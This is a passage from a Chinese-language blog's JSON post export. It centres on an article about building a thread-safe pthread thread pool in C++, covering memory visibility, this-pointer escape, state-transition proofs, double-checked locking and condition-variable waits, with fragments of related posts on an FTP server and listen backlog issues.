use</code></p>\n</li>\n<li><p>server listen的端口的backlog设太小（20），测试程序开的链接数一多，就有一些链接三次握手成功，但是hang住在读取welcome信息那里，详见笔者的另一篇博文<a href=\"https://h-zex.github.io/2019/03/19/%E9%AB%98%E5%B9%B6%E5%8F%91%E6%83%85%E5%86%B5%E4%B8%8Bbacklog%E8%BF%87%E4%BD%8E%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98/\">高并发情况下backlog过低出现的问题</a></p>\n</li>\n</ul>\n<h3 id=\"缺点\"><a href=\"#缺点\" class=\"headerlink\" title=\"缺点\"></a>缺点</h3><ul>\n<li>因为使用是线程池，并且似乎一个线程不能设置另一个线程的uid（欢迎指正！），所以无法利用OS的机制实现权限控制</li>\n<li>只有单个线程accept，可以通过linux内核3.9的一个特性<code>SO_REUSEPORT</code>来实现多线程accept，并且没有惊群、负载不均衡的问题（<a href=\"https://lwn.net/Articles/542629/\" target=\"_blank\" rel=\"noopener\">The SO_REUSEPORT socket option</a>）</li>\n</ul>\n","slug":"开发一个高并发的FTP服务器","categories":[{"name":"网络编程","slug":"网络编程","permalink":"https://h-zex.github.io/categories/网络编程/"},{"name":"并发编程","slug":"网络编程/并发编程","permalink":"https://h-zex.github.io/categories/网络编程/并发编程/"}],"tags":[{"name":"FTP 服务器","slug":"FTP-服务器","permalink":"https://h-zex.github.io/tags/FTP-服务器/"},{"name":"高并发","slug":"高并发","permalink":"https://h-zex.github.io/tags/高并发/"}]},{"title":"Construct a Thread-Safe ThreadPool","date":"2019-03-20T01:58:41.000Z","path":"2019/03/20/construct-a-thread-safe-threadpool/","text":"代码 链接：https://github.com/H-ZeX/FTP-Implement/blob/master/src/main/tools/ThreadPool.hpp 测试代码链接：https://github.com/H-ZeX/FTP-Implement/blob/master/src/test/tools/ThreadPoolTest.hpp 代码依赖于项目中的基础设施，所以不能直接使用 线程安全的两个要点 原子性：一组操作要么不执行，要么完全执行 内存可见性：一个线程对于某个对象、变量的修改对于另一个线程是否可见，什么时候可见，该数据可见时其他数据的的可见情况 使用pthread时保证内存可见性 由于笔者对pthread的内存模型不熟悉、不清楚c++中的volatile语义是否编译器相关的，所以，在构造这个ThreadPool时不敢使用volatile等来实现内存可见性。而是通过加锁以充当内存屏障来实现——虽然性能上会受到影响，但是至少可以保证正确性 pthread创建线程时，传递的start_routine参数必须是static方法，这意味着，需要把ThreadPool的this指针传递过去。但是，一个严重的问题，this指针是在原线程初始化的，ThreadPool对象也是在原线程构造的，那么，如何保证新线程看到一致的、正确构造的ThreadPool对象？在java内存模型中，这是无法保证的，必须使用其他办法来保证（volatile、final、AtomicReference等）。笔者不清楚pthread是否可以保证传递过去的参数的内存可见性，虽然实验中，clang++7开-O3，测试了5k多次，在另一个线程都可以看到正确的对象，但是因为不确定这是否是编译器相关的。所以，笔者使用了一个全局mutex，充当内存屏障——每次写该变量时持有该mutex，每次读时也要持有，以保证新线程可以看到正确构造的、一致的对象 有另一个问题，mutex对象的内存可见性如何保证？按照JCIP（java concurrency in practice）的说法，即使是一个线程安全的对象，也需要被安全的发布（发布（publish）：使对象能够在当前作用域之外的代码中使用）。保护this指针的mutex是全局变量，那么我认为其可见性应该是可以保证的，因为在编译期就已经初始化完成该mutex（欢迎指正！） 1static pthread_mutex_t poolPtrAndSigToBlockMutex = PTHREAD_MUTEX_INITIALIZER; 而对于那些是类内变量（非static）的mutex，因为每次获得threadPool对象时，都是在持有保护this指针的mutex时解引用this指针，所以我认为可以保证另一个线程可以看到完整的、一致的对象（欢迎指正！） （2019.4.16更新） 在PROGRAMMING WITH POSIX THREADS的3.4，有这么一段 Pthreads provides a few basic rules about memory visibility. You can count on all implementations of the standard to follow these rules: Whatever memory values a thread can see when it calls pthread_create can also be seen by the new thread when it starts. Any data written to memory after the call to pthread_create may not necessarily be seen by the new thread, even if the write occurs before the thread starts. Whatever memory values a thread can see when it unlocks a mutex, either directly or by waiting on a condition variable, can also be seen by any thread that later locks the same mutex. Again, data written after the mutex is unlocked may not necessarily be seen by the thread that locks the mutex, even if the write occurs before the lock. Whatever memory values a thread can see when it terminates, either by cancellation, returning from its start function, or by calling pthread_exit, can also be seen by the thread that joins with the terminated thread by calling pthread_join. And, of course, data written after the thread terminates may not necessarily be seen by the thread that joins, even if the write occurs before the join. Whatever memory values a thread can see when it signals or broadcasts a condition variable can also be seen by any thread that is awakened by that signal or broadcast. And, one more time, data written after the signal or broadcast may not necessarily be seen by the thread that wakes up, even if the write occurs before it awakens. 在The Open Group Base Specifications Issue 7, 2018 edition有这么一段 4.12 Memory Synchronization Applications shall ensure that access to any memory location by more than one thread of control (threads or processes) is restricted such that no thread of control can read or modify a memory location while another thread of control may be modifying it. Such access is restricted using functions that synchronize thread execution and also synchronize memory with respect to other threads. The following functions synchronize memory(是不是就是内存屏障？) with respect to other threads: fork()pthread_barrier_wait()pthread_cond_broadcast()pthread_cond_signal()pthread_cond_timedwait()pthread_cond_wait()pthread_create()pthread_join()pthread_mutex_lock()pthread_mutex_timedlock()pthread_mutex_trylock()pthread_mutex_unlock()pthread_spin_lock()pthread_spin_trylock()pthread_spin_unlock()pthread_rwlock_rdlock()pthread_rwlock_timedrdlock()pthread_rwlock_timedwrlock()pthread_rwlock_tryrdlock()pthread_rwlock_trywrlock()pthread_rwlock_unlock()pthread_rwlock_wrlock()sem_post()sem_timedwait()sem_trywait()sem_wait()semctl()semop()wait()waitpid() this指针逸出问题 根据JCIP，逸出（escape）的含义是在对象构造完成前就发布该对象，从而另一个线程看到一个没有完全构造的对象 如果在构造函数里启动线程，那么就是典型的this指针逸出——在构造函数还没运行完前，另一个线程就已经看到了this指针，从而看到了一个没有完全构造的对象 解决方法是使用一个start函数，用户获得ThreadPool实例后，手动调用start方法，以启动工作线程 状态转换的证明 ThreadPool需要维护自己当前处于哪一个状态 1NEW, RUNNING, GRACEFUL_SHUTDOWN, IMMEDIATE_SHUTDOWN 并且保证程序中只有合法的状态转移。这需要证明。 在我的实现的线程池中，状态的转换是 123NEW-&gt;RUNNING-&gt;GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWNorNEW-&gt;GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWN 证明是 1234567891011121314In the constructor, the state is set to NEW.In the start method, the state is set to RUNNING.In the shutdown method, the state set to GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWN.proof of the state transformation safety.For any instance of this ThreadPool,the constructor run only one time,so for any instance, if it is not NEW state,it will never be NEW state.After the shutdown method is called,no other public method except destructor and getInstance can be called,so if it is shutdown state, it will always be shutdown state.Every time the state is modify, it is protected by taskQueAndStateMutex,so there is no thread safety problem. 单例模式 因为使用了全局变量mutex，所以这个类只能是单例模式 在java中，有一个DCL（double check locking），其代码如下 1234567891011private static Object instance = null;public Object getInstance() &#123; if (instance == null) &#123; synchronized (this) &#123; if (instance == null) instance = new Object(); &#125; &#125; return instance;&#125; 这个写法有个问题，另一个线程可能看到一个instance引用已经被初始化完成，但是对象构造函数还未完成的对象——因为内存重排序，编译器可以先初始化引用再完成构造函数的运行 因为不清楚pthread是否也会有这种问题，所以对于获得ThreadPool实例的getInstance方法，每次都要加锁，然后才检查instance指针 使用条件变量的注意事项 wait Condition变量前要检查条件是否满足，否则可能出现：条件以满足，所以生产者不再notify，然后消费者就一直hang在cond wait那里 检查条件时要使用while而不是if 123456789// 正面例子while (not satify condition) &#123; cond.wait()&#125;// 反面例子if(not satify condition) &#123; cond.wait&#125; 一个很重要的原因：某个线程正在等待，然后被唤醒，这时候，突然一个新线程（该线程之前并没有在等待该cond）进来，拿走了资源，结果醒来的线程拿不到资源，所以应该继续等。另外wiki（Spurious wakeup）上还讲了另一个原因，就是说在现代处理器上，要保证没有假醒需要较高的代价。不过，JCIP（java concurrency in practice）上虽然有打比方说“因为线路故障导致烤面包机提前响起”，但是没有明确说存在这种硬件上导致的假醒","raw":"---\ntitle: Construct a Thread-Safe ThreadPool\ndate: 2019-03-20 09:58:41\ntags:\n- 线程安全\n- 线程池\n- 原子性\n- 内存可见性\ncategories:\n- 并发编程\n---\n\n#### 代码\n\n- 链接：[https://github.com/H-ZeX/FTP-Implement/blob/master/src/main/tools/ThreadPool.hpp](https://github.com/H-ZeX/FTP-Implement/blob/master/src/main/tools/ThreadPool.hpp)\n- 测试代码链接：[https://github.com/H-ZeX/FTP-Implement/blob/master/src/test/tools/ThreadPoolTest.hpp](https://github.com/H-ZeX/FTP-Implement/blob/master/src/test/tools/ThreadPoolTest.hpp)\n- 代码依赖于项目中的基础设施，所以不能直接使用\n\n#### 线程安全的两个要点\n\n- 原子性：一组操作要么不执行，要么完全执行\n\n- 内存可见性：一个线程对于某个对象、变量的修改对于另一个线程是否可见，什么时候可见，该数据可见时其他数据的的可见情况\n\n#### 使用pthread时保证内存可见性\n\n- 由于笔者对pthread的内存模型不熟悉、不清楚c++中的`volatile`语义是否编译器相关的，所以，在构造这个ThreadPool时不敢使用`volatile`等来实现内存可见性。而是通过加锁以充当内存屏障来实现——虽然性能上会受到影响，但是至少可以保证正确性\n\n- pthread创建线程时，传递的`start_routine`参数必须是static方法，这意味着，需要把ThreadPool的`this`指针传递过去。但是，一个严重的问题，`this`指针是在原线程初始化的，ThreadPool对象也是在原线程构造的，那么，如何保证新线程看到一致的、正确构造的ThreadPool对象？在java内存模型中，这是无法保证的，必须使用其他办法来保证（`volatile`、`final`、`AtomicReference`等）。笔者不清楚pthread是否可以保证传递过去的参数的内存可见性，虽然实验中，clang++7开`-O3`，测试了5k多次，在另一个线程都可以看到正确的对象，但是因为不确定这是否是编译器相关的。所以，笔者使用了一个全局mutex，充当内存屏障——每次写该变量时持有该mutex，每次读时也要持有，以保证新线程可以看到正确构造的、一致的对象\n\n- 有另一个问题，mutex对象的内存可见性如何保证？按照JCIP（java concurrency in practice）的说法，即使是一个线程安全的对象，也需要被安全的发布（发布（publish）：使对象能够在当前作用域之外的代码中使用）。保护this指针的mutex是全局变量，那么我认为其可见性应该是可以保证的，因为在编译期就已经初始化完成该mutex（欢迎指正！）\n\n  ```c\n  static pthread_mutex_t poolPtrAndSigToBlockMutex = PTHREAD_MUTEX_INITIALIZER;\n  ```\n\n  而对于那些是类内变量（非static）的mutex，因为每次获得threadPool对象时，都是在持有保护`this`指针的mutex时解引用`this`指针，所以我认为可以保证另一个线程可以看到完整的、一致的对象（欢迎指正！）\n\n- （2019.4.16更新）\n   - 在*PROGRAMMING WITH POSIX THREADS*的3.4，有这么一段\n      > Pthreads provides a few basic rules about memory visibility. You can count on all implementations of the standard to follow these rules: \n      > 1. Whatever memory values a thread can see when it calls pthread_create can also be seen by the new thread when it starts. Any data written to memory after the call to pthread_create may not necessarily be seen by the new thread, even if the write occurs before the thread starts. \n      > 2. Whatever memory values a thread can see when it unlocks a mutex, either directly or by waiting on a condition variable, can also be seen by any thread that later locks the same mutex. Again, data written after the mutex is unlocked may not necessarily be seen by the thread that locks the mutex, even if the write occurs before the lock. \n      > 3. Whatever memory values a thread can see when it terminates, either by cancellation, returning from its start function, or by calling pthread_exit, can also be seen by the thread that joins with the terminated thread by calling pthread_join. And, of course, data written after the thread terminates may not necessarily be seen by the thread that joins, even if the write occurs before the join. \n      > 4. Whatever memory values a thread can see when it signals or broadcasts a condition variable can also be seen by any thread that is awakened by that signal or broadcast. And, one more time, data written after the signal or broadcast may not necessarily be seen by the thread that wakes up, even if the write occurs before it awakens.\n   - 在[The Open Group Base Specifications Issue 7, 2018 edition](http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html#tag_04_12)有这么一段\n      > 4.12 Memory Synchronization\n      >\n      > Applications shall ensure that access to any memory location by more than one thread of control (threads or processes) is restricted such that no thread of control can read or modify a memory location while another thread of control may be modifying it. Such access is restricted using functions that synchronize thread execution and also synchronize memory with respect to other threads. The following functions **synchronize memory**(是不是就是内存屏障？) with respect to other threads:\n      >\n      > `fork()`\n      > `pthread_barrier_wait()`\n      > `pthread_cond_broadcast()`\n      > `pthread_cond_signal()`\n      > `pthread_cond_timedwait()`\n      > `pthread_cond_wait()`\n      > `pthread_create()`\n      > `pthread_join()`\n      > `pthread_mutex_lock()`\n      > `pthread_mutex_timedlock()`\n      > `pthread_mutex_trylock()`\n      > `pthread_mutex_unlock()`\n      > `pthread_spin_lock()`\n      > `pthread_spin_trylock()`\n      > `pthread_spin_unlock()`\n      > `pthread_rwlock_rdlock()`\n      > `pthread_rwlock_timedrdlock()`\n      > `pthread_rwlock_timedwrlock()`\n      > `pthread_rwlock_tryrdlock()`\n      > `pthread_rwlock_trywrlock()`\n      > `pthread_rwlock_unlock()`\n      > `pthread_rwlock_wrlock()`\n      > `sem_post()`\n      > `sem_timedwait()`\n      > `sem_trywait()`\n      > `sem_wait()`\n      > `semctl()`\n      > `semop()`\n      > `wait()`\n      > `waitpid()`\n\n\n#### `this`指针逸出问题\n\n- 根据JCIP，逸出（escape）的含义是在对象构造完成前就发布该对象，从而另一个线程看到一个没有完全构造的对象\n- 如果在构造函数里启动线程，那么就是典型的`this`指针逸出——在构造函数还没运行完前，另一个线程就已经看到了`this`指针，从而看到了一个没有完全构造的对象\n- 解决方法是使用一个start函数，用户获得ThreadPool实例后，手动调用start方法，以启动工作线程\n\n#### 状态转换的证明\n\n- ThreadPool需要维护自己当前处于哪一个状态\n\n  ```c++\n  NEW, RUNNING, GRACEFUL_SHUTDOWN, IMMEDIATE_SHUTDOWN\n  ```\n\n  并且保证程序中只有合法的状态转移。这需要证明。\n\n- 在我的实现的线程池中，状态的转换是\n\n  ```\n  NEW->RUNNING->GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWN\n  or\n  NEW->GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWN\n  ```\n\n  证明是\n\n  ```\n  In the constructor, the state is set to NEW.\n  In the start method, the state is set to RUNNING.\n  In the shutdown method, the state set to GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWN.\n  \n  proof of the state transformation safety.\n  For any instance of this ThreadPool,\n  the constructor run only one time,\n  so for any instance, if it is not NEW state,\n  it will never be NEW state.\n  After the shutdown method is called,\n  no other public method except destructor and getInstance can be called,\n  so if it is shutdown state, it will always be shutdown state.\n  Every time the state is modify, it is protected by taskQueAndStateMutex,\n  so there is no thread safety problem.\n  ```\n\n#### 单例模式\n\n- 因为使用了全局变量mutex，所以这个类只能是单例模式\n\n- 在java中，有一个DCL（double check locking），其代码如下\n\n  ```java\n  private static Object instance = null;\n  \n  public Object getInstance() {\n    if (instance == null) {\n      synchronized (this) {\n        if (instance == null)\n          instance = new Object();\n      }\n    }\n    return instance;\n  }\n  ```\n\n  这个写法有个问题，另一个线程可能看到一个`instance`引用已经被初始化完成，但是对象构造函数还未完成的对象——因为内存重排序，编译器可以先初始化引用再完成构造函数的运行\n\n- 因为不清楚pthread是否也会有这种问题，所以对于获得ThreadPool实例的`getInstance`方法，每次都要加锁，然后才检查instance指针\n\n#### 使用条件变量的注意事项\n\n- wait Condition变量前要检查条件是否满足，否则可能出现：条件以满足，所以生产者不再notify，然后消费者就一直hang在cond wait那里\n\n- 检查条件时要使用`while`而不是`if`\n\n  ```cpp\n  // 正面例子\n  while (not satify condition) {\n      cond.wait()\n  }\n  \n  // 反面例子\n  if(not satify condition) {\n      cond.wait\n  }\n  ```\n\n  一个很重要的原因：某个线程正在等待，然后被唤醒，这时候，突然一个新线程（该线程之前并没有在等待该cond）进来，拿走了资源，结果醒来的线程拿不到资源，所以应该继续等。另外wiki（[Spurious wakeup](https://en.wikipedia.org/wiki/Spurious_wakeup)）上还讲了另一个原因，就是说在现代处理器上，要保证没有假醒需要较高的代价。不过，JCIP（java concurrency in practice）上虽然有打比方说“因为线路故障导致烤面包机提前响起”，但是没有明确说存在这种硬件上导致的假醒\n\n","content":"<h4 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h4><ul>\n<li>链接：<a href=\"https://github.com/H-ZeX/FTP-Implement/blob/master/src/main/tools/ThreadPool.hpp\" target=\"_blank\" rel=\"noopener\">https://github.com/H-ZeX/FTP-Implement/blob/master/src/main/tools/ThreadPool.hpp</a></li>\n<li>测试代码链接：<a href=\"https://github.com/H-ZeX/FTP-Implement/blob/master/src/test/tools/ThreadPoolTest.hpp\" target=\"_blank\" rel=\"noopener\">https://github.com/H-ZeX/FTP-Implement/blob/master/src/test/tools/ThreadPoolTest.hpp</a></li>\n<li>代码依赖于项目中的基础设施，所以不能直接使用</li>\n</ul>\n<h4 id=\"线程安全的两个要点\"><a href=\"#线程安全的两个要点\" class=\"headerlink\" title=\"线程安全的两个要点\"></a>线程安全的两个要点</h4><ul>\n<li><p>原子性：一组操作要么不执行，要么完全执行</p>\n</li>\n<li><p>内存可见性：一个线程对于某个对象、变量的修改对于另一个线程是否可见，什么时候可见，该数据可见时其他数据的的可见情况</p>\n</li>\n</ul>\n<h4 id=\"使用pthread时保证内存可见性\"><a href=\"#使用pthread时保证内存可见性\" class=\"headerlink\" title=\"使用pthread时保证内存可见性\"></a>使用pthread时保证内存可见性</h4><ul>\n<li><p>由于笔者对pthread的内存模型不熟悉、不清楚c++中的<code>volatile</code>语义是否编译器相关的，所以，在构造这个ThreadPool时不敢使用<code>volatile</code>等来实现内存可见性。而是通过加锁以充当内存屏障来实现——虽然性能上会受到影响，但是至少可以保证正确性</p>\n</li>\n<li><p>pthread创建线程时，传递的<code>start_routine</code>参数必须是static方法，这意味着，需要把ThreadPool的<code>this</code>指针传递过去。但是，一个严重的问题，<code>this</code>指针是在原线程初始化的，ThreadPool对象也是在原线程构造的，那么，如何保证新线程看到一致的、正确构造的ThreadPool对象？在java内存模型中，这是无法保证的，必须使用其他办法来保证（<code>volatile</code>、<code>final</code>、<code>AtomicReference</code>等）。笔者不清楚pthread是否可以保证传递过去的参数的内存可见性，虽然实验中，clang++7开<code>-O3</code>，测试了5k多次，在另一个线程都可以看到正确的对象，但是因为不确定这是否是编译器相关的。所以，笔者使用了一个全局mutex，充当内存屏障——每次写该变量时持有该mutex，每次读时也要持有，以保证新线程可以看到正确构造的、一致的对象</p>\n</li>\n<li><p>有另一个问题，mutex对象的内存可见性如何保证？按照JCIP（java concurrency in practice）的说法，即使是一个线程安全的对象，也需要被安全的发布（发布（publish）：使对象能够在当前作用域之外的代码中使用）。保护this指针的mutex是全局变量，那么我认为其可见性应该是可以保证的，因为在编译期就已经初始化完成该mutex（欢迎指正！）</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">pthread_mutex_t</span> poolPtrAndSigToBlockMutex = PTHREAD_MUTEX_INITIALIZER;</span><br></pre></td></tr></table></figure>\n<p>而对于那些是类内变量（非static）的mutex，因为每次获得threadPool对象时，都是在持有保护<code>this</code>指针的mutex时解引用<code>this</code>指针，所以我认为可以保证另一个线程可以看到完整的、一致的对象（欢迎指正！）</p>\n</li>\n<li><p>（2019.4.16更新）</p>\n<ul>\n<li>在<em>PROGRAMMING WITH POSIX THREADS</em>的3.4，有这么一段<blockquote>\n<p>Pthreads provides a few basic rules about memory visibility. You can count on all implementations of the standard to follow these rules: </p>\n<ol>\n<li>Whatever memory values a thread can see when it calls pthread_create can also be seen by the new thread when it starts. Any data written to memory after the call to pthread_create may not necessarily be seen by the new thread, even if the write occurs before the thread starts. </li>\n<li>Whatever memory values a thread can see when it unlocks a mutex, either directly or by waiting on a condition variable, can also be seen by any thread that later locks the same mutex. Again, data written after the mutex is unlocked may not necessarily be seen by the thread that locks the mutex, even if the write occurs before the lock. </li>\n<li>Whatever memory values a thread can see when it terminates, either by cancellation, returning from its start function, or by calling pthread_exit, can also be seen by the thread that joins with the terminated thread by calling pthread_join. And, of course, data written after the thread terminates may not necessarily be seen by the thread that joins, even if the write occurs before the join. </li>\n<li>Whatever memory values a thread can see when it signals or broadcasts a condition variable can also be seen by any thread that is awakened by that signal or broadcast. And, one more time, data written after the signal or broadcast may not necessarily be seen by the thread that wakes up, even if the write occurs before it awakens.</li>\n</ol>\n</blockquote>\n</li>\n<li>在<a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html#tag_04_12\" target=\"_blank\" rel=\"noopener\">The Open Group Base Specifications Issue 7, 2018 edition</a>有这么一段<blockquote>\n<p>4.12 Memory Synchronization</p>\n<p>Applications shall ensure that access to any memory location by more than one thread of control (threads or processes) is restricted such that no thread of control can read or modify a memory location while another thread of control may be modifying it. Such access is restricted using functions that synchronize thread execution and also synchronize memory with respect to other threads. The following functions <strong>synchronize memory</strong>(是不是就是内存屏障？) with respect to other threads:</p>\n<p><code>fork()</code><br><code>pthread_barrier_wait()</code><br><code>pthread_cond_broadcast()</code><br><code>pthread_cond_signal()</code><br><code>pthread_cond_timedwait()</code><br><code>pthread_cond_wait()</code><br><code>pthread_create()</code><br><code>pthread_join()</code><br><code>pthread_mutex_lock()</code><br><code>pthread_mutex_timedlock()</code><br><code>pthread_mutex_trylock()</code><br><code>pthread_mutex_unlock()</code><br><code>pthread_spin_lock()</code><br><code>pthread_spin_trylock()</code><br><code>pthread_spin_unlock()</code><br><code>pthread_rwlock_rdlock()</code><br><code>pthread_rwlock_timedrdlock()</code><br><code>pthread_rwlock_timedwrlock()</code><br><code>pthread_rwlock_tryrdlock()</code><br><code>pthread_rwlock_trywrlock()</code><br><code>pthread_rwlock_unlock()</code><br><code>pthread_rwlock_wrlock()</code><br><code>sem_post()</code><br><code>sem_timedwait()</code><br><code>sem_trywait()</code><br><code>sem_wait()</code><br><code>semctl()</code><br><code>semop()</code><br><code>wait()</code><br><code>waitpid()</code></p>\n</blockquote>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"this指针逸出问题\"><a href=\"#this指针逸出问题\" class=\"headerlink\" title=\"this指针逸出问题\"></a><code>this</code>指针逸出问题</h4><ul>\n<li>根据JCIP，逸出（escape）的含义是在对象构造完成前就发布该对象，从而另一个线程看到一个没有完全构造的对象</li>\n<li>如果在构造函数里启动线程，那么就是典型的<code>this</code>指针逸出——在构造函数还没运行完前，另一个线程就已经看到了<code>this</code>指针，从而看到了一个没有完全构造的对象</li>\n<li>解决方法是使用一个start函数，用户获得ThreadPool实例后，手动调用start方法，以启动工作线程</li>\n</ul>\n<h4 id=\"状态转换的证明\"><a href=\"#状态转换的证明\" class=\"headerlink\" title=\"状态转换的证明\"></a>状态转换的证明</h4><ul>\n<li><p>ThreadPool需要维护自己当前处于哪一个状态</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NEW, RUNNING, GRACEFUL_SHUTDOWN, IMMEDIATE_SHUTDOWN</span><br></pre></td></tr></table></figure>\n<p>并且保证程序中只有合法的状态转移。这需要证明。</p>\n</li>\n<li><p>在我的实现的线程池中，状态的转换是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NEW-&gt;RUNNING-&gt;GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWN</span><br><span class=\"line\">or</span><br><span class=\"line\">NEW-&gt;GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWN</span><br></pre></td></tr></table></figure>\n<p>证明是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">In the constructor, the state is set to NEW.</span><br><span class=\"line\">In the start method, the state is set to RUNNING.</span><br><span class=\"line\">In the shutdown method, the state set to GRACEFUL_SHUTDOWN or IMMEDIATE_SHUTDOWN.</span><br><span class=\"line\"></span><br><span class=\"line\">proof of the state transformation safety.</span><br><span class=\"line\">For any instance of this ThreadPool,</span><br><span class=\"line\">the constructor run only one time,</span><br><span class=\"line\">so for any instance, if it is not NEW state,</span><br><span class=\"line\">it will never be NEW state.</span><br><span class=\"line\">After the shutdown method is called,</span><br><span class=\"line\">no other public method except destructor and getInstance can be called,</span><br><span class=\"line\">so if it is shutdown state, it will always be shutdown state.</span><br><span class=\"line\">Every time the state is modify, it is protected by taskQueAndStateMutex,</span><br><span class=\"line\">so there is no thread safety problem.</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h4 id=\"单例模式\"><a href=\"#单例模式\" class=\"headerlink\" title=\"单例模式\"></a>单例模式</h4><ul>\n<li><p>因为使用了全局变量mutex，所以这个类只能是单例模式</p>\n</li>\n<li><p>在java中，有一个DCL（double check locking），其代码如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Object instance = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">getInstance</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (instance == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (<span class=\"keyword\">this</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (instance == <span class=\"keyword\">null</span>)</span><br><span class=\"line\">        instance = <span class=\"keyword\">new</span> Object();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> instance;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个写法有个问题，另一个线程可能看到一个<code>instance</code>引用已经被初始化完成，但是对象构造函数还未完成的对象——因为内存重排序，编译器可以先初始化引用再完成构造函数的运行</p>\n</li>\n<li><p>因为不清楚pthread是否也会有这种问题，所以对于获得ThreadPool实例的<code>getInstance</code>方法，每次都要加锁，然后才检查instance指针</p>\n</li>\n</ul>\n<h4 id=\"使用条件变量的注意事项\"><a href=\"#使用条件变量的注意事项\" class=\"headerlink\" title=\"使用条件变量的注意事项\"></a>使用条件变量的注意事项</h4><ul>\n<li><p>wait Condition变量前要检查条件是否满足，否则可能出现：条件以满足，所以生产者不再notify，然后消费者就一直hang在cond wait那里</p>\n</li>\n<li><p>检查条件时要使用<code>while</code>而不是<code>if</code></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 正面例子</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"keyword\">not</span> satify condition) &#123;</span><br><span class=\"line\">    cond.wait()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 反面例子</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">not</span> satify condition) &#123;</span><br><span class=\"line\">    cond.wait</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>一个很重要的原因：某个线程正在等待，然后被唤醒，这时候，突然一个新线程（该线程之前并没有在等待该cond）进来，拿走了资源，结果醒来的线程拿不到资源，所以应该继续等。另外wiki（<a href=\"https://en.wikipedia.org/wiki/Spurious_wakeup\" target=\"_blank\" rel=\"noopener\">Spurious wakeup</a>）上还讲了另一个原因，就是说在现代处理器上，要保证没有假醒需要较高的代价。不过，JCIP（java concurrency in practice）上虽然有打比方说“因为线路故障导致烤面包机提前响起”，但是没有明确说存在这种硬件上导致的假醒</p>\n</li>\n</ul>\n","slug":"construct-a-thread-safe-threadpool","categories":[{"name":"并发编程","slug":"并发编程","permalink":"https://h-zex.github.io/categories/并发编程/"}],"tags":[{"name":"线程安全","slug":"线程安全","permalink":"https://h-zex.github.io/tags/线程安全/"},{"name":"线程池","slug":"线程池","permalink":"https://h-zex.github.io/tags/线程池/"},{"name":"原子性","slug":"原子性","permalink":"https://h-zex.github.io/tags/原子性/"},{"name":"内存可见性","slug":"内存可见性","permalink":"https://h-zex.github.io/tags/内存可见性/"}]},{"title":"高并发情况下backlog过低出现的问题","date":"2019-03-19T13:58:41.000Z","path":"2019/03/19/高并发情况下backlog过低出现的问题/","text":"问题 最近重构一个以前写的FTP Server，压测时，服务器的backlog是20，然后client总是有一些链接，已经new Socket()成功（根据测试，这意味着三次握手完成），但是就是收不到welcome信息，服务端的log看到的accept的链接数目少于client打开的链接数目(服务端的accept也没有报错)，少的数量刚好是client端hang住在读welcome信息那些链接的数目。后来尝试了调整ulimit无果，调整了backlog后就好了。看起来就像是一些链接被悄无声息（没有返回FIN或RST之类的报文）地从 等待被应用accept的队列 移除。 